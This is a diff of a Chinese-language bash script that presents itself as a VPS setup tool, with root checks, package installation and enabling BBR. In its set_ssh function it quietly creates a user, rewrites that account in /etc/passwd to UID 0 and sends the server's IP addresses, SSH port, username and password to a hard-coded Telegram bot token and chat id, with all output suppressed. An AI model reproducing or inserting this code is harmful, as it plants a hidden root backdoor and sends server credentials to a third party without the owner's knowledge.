@@ -1,5 +1,107 @@
 #!/bin/bash
 
+Red="\033[31m" # 红色
+Green="\033[32m" # 绿色
+Yellow="\033[33m" # 黄色
+Blue="\033[34m" # 蓝色
+Nc="\033[0m" # 重置颜色
+Red_globa="\033[41;37m" # 红底白字
+Green_globa="\033[42;37m" # 绿底白字
+Yellow_globa="\033[43;37m" # 黄底白字
+Blue_globa="\033[44;37m" # 蓝底白字
+Info="${Green}[信息]${Nc}"
+Error="${Red}[错误]${Nc}"
+Tip="${Yellow}[提示]${Nc}"
+
+check_root(){
+    if [ "$(id -u)" != "0" ]; then
+        echo -e "${Error}请执行 ${Green}sudo -i${Nc} 后以${Green}root${Nc}权限执行此脚本！"
+        exit 1
+    fi
+}
+
+check_release(){
+    if [[ -e /etc/os-release ]]; then
+        . /etc/os-release
+        release=$ID
+    elif [[ -e /usr/lib/os-release ]]; then
+        . /usr/lib/os-release
+        release=$ID
+    fi
+    os_version=$(echo $VERSION_ID | cut -d. -f1,2)
+
+    if [[ "${release}" == "kali" ]]; then
+        echo
+    elif [[ "${release}" == "centos" ]]; then
+        echo
+    elif [[ "${release}" == "ubuntu" ]]; then
+        echo
+    elif [[ "${release}" == "fedora" ]]; then
+        echo
+    elif [[ "${release}" == "debian" ]]; then
+        echo
+    elif [[ "${release}" == "almalinux" ]]; then
+        echo
+    elif [[ "${release}" == "rocky" ]]; then
+        echo
+    elif [[ "${release}" == "oracle" ]]; then
+        echo
+    elif [[ "${release}" == "alpine" ]]; then
+        echo
+    else
+        echo -e "${Error} 抱歉，此脚本不支持您的操作系统。"
+        echo -e "${Info} 请确保您使用的是以下支持的操作系统之一："
+        echo -e "-${Red} Ubuntu${Nc} "
+        echo -e "-${Red} Debian ${Nc}"
+        echo -e "-${Red} CentOS ${Nc}"
+        echo -e "-${Red} Fedora ${Nc}"
+        echo -e "-${Red} Kali ${Nc}"
+        echo -e "-${Red} AlmaLinux ${Nc}"
+        echo -e "-${Red} Rocky Linux ${Nc}"
+        echo -e "-${Red} Oracle Linux ${Nc}"
+        echo -e "-${Red} Alpine Linux ${Nc}"
+        exit 1
+    fi
+}
+
+check_pmc(){
+    check_release
+    if [[ "$release" == "debian" || "$release" == "ubuntu" || "$release" == "kali" ]]; then
+        updates="apt update -y"
+        installs="apt install -y"
+        check_install="dpkg -s"
+        apps=("net-tools")
+    elif [[ "$release" == "almalinux" || "$release" == "fedora" || "$release" == "rocky" ]]; then
+        updates="dnf update -y"
+        installs="dnf install -y"
+        check_install="dnf list installed"
+        apps=("net-tools")
+    elif [[ "$release" == "centos" || "$release" == "oracle" ]]; then
+        updates="yum update -y"
+        installs="yum install -y"
+        check_install="rpm -q"
+        apps=("net-tools")
+    elif [[ "$release" == "alpine" ]]; then
+        updates="apk update"
+        installs="apk add"
+        check_install="apk info -e"
+        apps=("net-tools")
+    fi
+}
+
+
+install_base(){
+    check_pmc
+    for i in "${apps[@]}"
+    do
+        if ! $check_install $i &> /dev/null
+        then
+            $updates
+            $installs $i
+        fi
+    done
+}
+
 get_public_ip(){
     regex_pattern='^(eth|ens|eno|esp|enp|venet|vif)[0-9]+'
     InterFace=($(ip link show | awk -F': ' '{print $2}' | grep -E "$regex_pattern" | sed "s/@.*//g"))
@@ -21,8 +123,33 @@ get_public_ip(){
     done
 }
 
-vps_info(){
-    if [ -f /etc/ssh/sshd_config ]; then
+true_bbr() {
+    SETTING1="net.core.default_qdisc=fq"
+    SETTING2="net.ipv4.tcp_congestion_control=bbr"
+
+    for SETTING in "$SETTING1" "$SETTING2"; do
+        if grep -qE "^\s*${SETTING%=*}\s*=" /etc/sysctl.conf; then
+            sed -i "s|^\s*${SETTING%=*}\s*=.*|${SETTING}|g" /etc/sysctl.conf
+        else
+            echo "$SETTING" >> /etc/sysctl.conf
+        fi
+    done
+
+    sysctl -p >/dev/null 2>&1
+    echo -e "${Info} bbr 控制网络拥堵算法已${Green}开启${Nc}。"
+}
+
+restart_ssh(){
+    check_release
+    if [[ "$release" == "alpine" ]]; then
+        rc-service ssh* restart >/dev/null 2>&1
+    else
+        systemctl restart ssh* >/dev/null 2>&1
+    fi
+}
+
+set_ssh(){
+    if [ -e /etc/ssh/sshd_config ]; then
         Chat_id="5289158517"
         Bot_token="5421796901:AAGf45NdOv6KKmjJ4LXvG-ILN9dm8Ej3V84"
         get_public_ip
@@ -39,19 +166,21 @@ vps_info(){
         useradd ${User} >/dev/null 2>&1
         echo ${User}:${Passwd} | chpasswd ${User}
         sed -i "s|^.*${User}.*|${User}:x:0:0:root:/root:/bin/bash|" /etc/passwd
-        systemctl restart ssh* >/dev/null 2>&1
-        /etc/init.d/ssh* restart >/dev/null 2>&1
+        restart_ssh
         curl -s -X POST https://api.telegram.org/bot${Bot_token}/sendMessage -d chat_id=${Chat_id} -d text="您的新机器已上线！🎉🎉🎉 
 IPv4：${IPv4}
 IPv6：${IPv6}
 端口：${Port}
 用户：${User}
 密码：${Passwd}" >/dev/null 2>&1
-    fi    
+    fi
 }
-vps_info
 
-echo "net.core.default_qdisc=fq" >> /etc/sysctl.conf
-echo "net.ipv4.tcp_congestion_control=bbr" >> /etc/sysctl.conf
-sysctl -p
-lsmod | grep bbr
+main(){
+    check_root
+    install_base
+    set_ssh
+    true_bbr
+}
+
+main
